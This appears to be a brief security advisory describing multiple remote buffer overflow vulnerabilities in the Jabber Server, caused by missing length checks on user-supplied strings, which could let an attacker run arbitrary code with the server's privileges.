Multiple remote buffer overflow vulnerabilities affect the Jabber Server. These issues are due to a failure of the application to properly validate the length of user-supplied strings prior to copying them into finite process buffers.

An attacker may leverage these issues to execute arbitrary code on a computer with the privileges of the server process. This may facilitate unauthorized access or privilege escalation.
